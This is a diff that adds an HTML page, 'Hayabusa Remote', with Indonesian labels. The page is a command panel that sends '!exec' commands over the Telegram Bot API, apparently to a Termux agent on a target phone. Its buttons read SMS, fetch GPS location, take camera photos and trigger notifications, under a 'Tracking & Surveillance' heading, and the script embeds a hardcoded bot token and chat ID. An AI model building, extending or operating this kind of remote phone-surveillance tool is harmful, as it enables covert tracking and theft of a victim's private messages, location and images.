@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HAYABUSA COMMAND CENTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .card { border: 1px solid #30363d; border-radius: 12px; margin-bottom: 20px; padding: 15px; background: #161b22; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        button { 
+            padding: 15px; border: 1px solid #30363d; border-radius: 8px; background: #21262d; 
+            color: #c9d1d9; cursor: pointer; font-size: 14px; font-weight: bold; transition: 0.2s;
+        }
+        button:hover { background: #30363d; border-color: #8b949e; }
+        button:active { background: #238636; color: #fff; transform: scale(0.98); }
+        h3 { font-size: 12px; text-transform: uppercase; color: #8b949e; margin-bottom: 15px; letter-spacing: 1px; }
+        .status-bar { color: #238636; font-size: 12px; margin-bottom: 20px; border: 1px solid #238636; display: inline-block; padding: 5px 15px; border-radius: 20px; }
+    </style>
+</head>
+<body>
+
+    <h2>🚀 HAYABUSA REMOTE</h2>
+    <div class="status-bar" id="log">SISTEM AKTIF - MONITORING</div>
+
+    <div class="card">
+        <h3>🎮 Kendali Perangkat (Butuh Termux)</h3>
+        <div class="grid">
+            <button onclick="sendCmd('vibrate')">📳 Getar HP</button>
+            <button onclick="sendCmd('battery')">🔋 Cek Baterai</button>
+            <button onclick="sendCmd('sms')">💳 Cek SMS</button>
+            <button onclick="sendCmd('toast')">💬 Kirim Notif</button>
+        </div>
+    </div>
+
+    <div class="card" style="border-color: #58a6ff;">
+        <h3>📍 Tracking & Surveillance</h3>
+        <div class="grid">
+            <button style="grid-column: span 2; background: #238636; color: white;" onclick="window.open('https://t.me/jasher_bot')">🛰️ BUKA LAPORAN TELEGRAM</button>
+            <button onclick="sendCmd('location')">🔍 Update GPS</button>
+            <button onclick="sendCmd('camera')">📸 Ambil Foto</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>🌐 Shortcut Apps</h3>
+        <div class="grid">
+            <button onclick="sendCmd('open_wa')">WhatsApp</button>
+            <button onclick="sendCmd('open_fb')">Facebook</button>
+        </div>
+    </div>
+
+    <script>
+        // MASUKKAN TOKEN DAN ID ABANG DI SINI
+        const BOT_TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
+        const CHAT_ID = "7596509818";
+
+        function sendCmd(cmd) {
+            const log = document.getElementById('log');
+            log.innerText = "MENGIRIM PERINTAH: " + cmd.toUpperCase();
+            log.style.color = "#e3b341";
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `!exec ${cmd}` // Perintah ini akan dibaca oleh Termux jika terinstall
+                })
+            }).then(() => {
+                setTimeout(() => {
+                    log.innerText = "PERINTAH TERKIRIM KE TELEGRAM";
+                    log.style.color = "#238636";
+                }, 1000);
+            }).catch(err => {
+                log.innerText = "GAGAL MENGIRIM PERINTAH";
+                log.style.color = "#f85149";
+            });
+        }
+    </script>
+</body>
+</html>
